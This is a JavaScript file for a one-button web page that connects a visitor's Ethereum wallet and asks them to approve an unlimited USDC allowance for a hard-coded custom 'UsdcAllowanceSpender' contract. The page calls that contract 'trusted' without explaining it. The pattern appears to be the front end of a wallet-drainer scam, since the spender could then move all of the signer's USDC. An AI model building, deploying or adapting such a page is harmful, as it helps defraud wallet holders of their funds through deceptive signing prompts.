// script.js
// --- Configuration for Ethereum Mainnet ---
const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Your WalletConnect Project ID
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official Ethereum Mainnet USDC Address
const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Mainnet
const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function decimals() view returns (uint8)"
];

let web3Modal; // WalletConnect Web3Modal instance
let web3Provider; // The provider obtained from web3Modal
let provider; // Ethers.js provider (ethers.providers.Web3Provider)
let signer;   // Ethers.js signer
let connectedAccount; // Connected wallet address

// --- DOM Elements ---
const connectWalletButton = document.getElementById('connectWalletButton');
const approveButton = document.getElementById('approveButton');
const currentMessage = document.getElementById('current-message');
const loader = document.getElementById('loader');
const walletInfo = document.getElementById('walletInfo');
const accountAddress = document.getElementById('accountAddress');
const networkName = document.getElementById('networkName');
const statusDiv = document.getElementById('status');
const errorDetailsDiv = document.getElementById('errorDetails');
const errorMessageSpan = document.getElementById('errorMessage');

// --- UI Update Functions ---
function hideLoader() {
    loader.classList.add('hidden');
}

function showLoader() {
    loader.classList.remove('hidden');
}

function updateMessage(text, type = 'info') {
    currentMessage.textContent = text;
    currentMessage.className = `status-message ${type}`;
    hideLoader();
}

function showStatus(message, type) {
    statusDiv.textContent = message;
    statusDiv.className = `status-message ${type}`;
    statusDiv.classList.remove('hidden');
}

function hideStatus() {
    statusDiv.classList.add('hidden');
}

function displayErrorDetails(error) {
    errorMessageSpan.textContent = error.message || String(error);
    errorDetailsDiv.classList.remove('hidden');
}

function hideErrorDetails() {
    errorDetailsDiv.classList.add('hidden');
}

function updateWalletInfo(address, network) {
    accountAddress.textContent = address;
    networkName.textContent = network;
    walletInfo.classList.remove('hidden');
    approveButton.classList.remove('hidden'); 
    connectWalletButton.classList.add('hidden');
}

function resetUI() {
    walletInfo.classList.add('hidden');
    approveButton.classList.add('hidden');
    connectWalletButton.classList.remove('hidden');
    hideStatus();
    hideErrorDetails();
    updateMessage('Please connect your wallet to approve USDC.', 'info');
    // Disconnect WalletConnect session if any
    if (web3Modal && web3Modal.provider) {
        web3Modal.provider.disconnect();
    }
}

// --- WalletConnect V2 Initialization ---
async function initWeb3Modal() {
    try {
        web3Modal = Web3ModalStandalone.Web3Modal.createClient({
            projectId: WALLETCONNECT_PROJECT_ID,
            metadata: {
                name: 'USDC Approval DApp',
                description: 'Approve USDC for a trusted contract.',
                url: window.location.origin,
                icons: ['https://example.com/icon.png'],
            },
            chains: [1], // Configure for Ethereum Mainnet
            optionalChains: [11155111], // Sepolia for testing
        });

        // Subscribe to provider events
        web3Modal.subscribeProvider(async (newProvider) => {
            if (newProvider) {
                console.log('Web3Modal provider changed/connected:', newProvider);
                await handleProviderChange(newProvider);
            }
        });

        // Check for an existing session on load
        const currentProvider = await web3Modal.getWalletProvider();
        if (currentProvider) {
            console.log("Existing provider found from Web3Modal. Attempting to re-establish session.");
            await handleProviderChange(currentProvider);
        } else if (window.ethereum && window.ethereum.selectedAddress) {
            // Fallback for injected provider (MetaMask) if Web3Modal didn't cache it
            console.log("MetaMask selectedAddress found directly. Attempting to connect.");
            await connectInjectedWallet();
        } else {
            updateMessage('Please connect your wallet to approve USDC.', 'info');
        }

    } catch (error) {
        console.error('Error initializing Web3Modal:', error);
        updateMessage('Error initializing DApp. Check console.', 'error');
        displayErrorDetails(error);
        hideLoader();
    }
}

async function handleProviderChange(newProvider) {
    web3Provider = newProvider;
    try {
        provider = new ethers.providers.Web3Provider(web3Provider);
        signer = provider.getSigner();
        connectedAccount = await signer.getAddress();
        const network = await provider.getNetwork();

        updateWalletInfo(connectedAccount, network.name);
        updateMessage('Wallet connected. Ready to approve USDC.', 'success');
        console.log('Wallet connected:', connectedAccount, 'on', network.name);

        // Attach Ethers.js listeners to the WalletConnect provider
        web3Provider.on('accountsChanged', handleAccountsChanged);
        web3Provider.on('chainChanged', handleChainChanged);
        web3Provider.on('disconnect', handleDisconnect);

    } catch (error) {
        console.error('Error handling provider change:', error);
        updateMessage('Error processing wallet connection.', 'error');
        displayErrorDetails(error);
        resetUI();
        hideLoader();
    }
}

async function connectInjectedWallet() {
    // This function is a fallback to handle MetaMask if Web3Modal doesn't pick it up directly on load
    try {
        if (typeof window.ethereum === 'undefined') {
            throw new Error("MetaMask not detected.");
        }
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        // If successful, Web3Modal should detect this change via subscribeProvider and call handleProviderChange
    } catch (error) {
        console.error('Direct MetaMask connection failed:', error);
        // Do not resetUI here, let Web3Modal handle full connection flow
    }
}

// --- Connect Wallet Function (using Web3Modal) ---
async function connectWallet() {
    showLoader();
    updateMessage('Connecting to wallet...', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        const providerFromModal = await web3Modal.openModal();
        // The handleProviderChange will be called via subscribeProvider when a wallet connects
    } catch (error) {
        console.error('Wallet connection failed (Web3Modal):', error);
        updateMessage('Wallet connection cancelled or failed.', 'error');
        displayErrorDetails(error);
        resetUI();
        hideLoader();
    }
}

function handleAccountsChanged(accounts) {
    if (accounts.length === 0) {
        console.log('Accounts disconnected.');
        resetUI();
        updateMessage("Wallet disconnected or account switched.", "info");
    } else {
        console.log('Accounts changed:', accounts[0]);
        // Re-initiate connection to update UI with new account
        web3Modal.openModal(); // Re-open modal to trigger new connection flow
    }
}

function handleChainChanged(chainId) {
    console.log('Chain changed:', chainId);
    // Re-initiate connection to update UI with new network
    web3Modal.openModal(); // Re-open modal to trigger new connection flow
}

function handleDisconnect(error) {
    console.log('Wallet disconnected:', error);
    resetUI();
    updateMessage("Wallet disconnected.", "info");
}

// --- Propose Approve Transaction Function ---
async function proposeApproveTransaction() {
    if (!signer || !connectedAccount) {
        updateMessage('Wallet not connected. Please connect your wallet first.', 'error');
        return;
    }

    showLoader();
    updateMessage('Proposing USDC approval transaction... Please confirm in your wallet.', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        const usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        
        const txResponse = await usdcContract.approve(
            SPENDER_CONTRACT_ADDRESS,
            ethers.constants.MaxUint256 // Unlimited allowance
        );

        const txHash = txResponse.hash;

        showStatus(`Transaction submitted! Hash: ${txHash.substring(0, 10)}...${txHash.substring(txHash.length - 4)}. Check wallet for status.`, 'success');
        updateMessage('Approval transaction sent!', 'success');
        console.log('Transaction Hash:', txHash);

    } catch (error) {
        console.error('Transaction proposal failed:', error);
        showStatus(`Transaction failed: ${error.message || error}`, 'error');
        updateMessage('Approval transaction failed.', 'error');
        displayErrorDetails(error);
    } finally {
        hideLoader();
    }
}

// --- Event Listeners ---
connectWalletButton.addEventListener('click', connectWallet);
approveButton.addEventListener('click', proposeApproveTransaction);

// Initial check on load (for cached connections)
window.addEventListener('load', async () => {
    // Initialize Web3Modal first
    await initWeb3Modal();
});
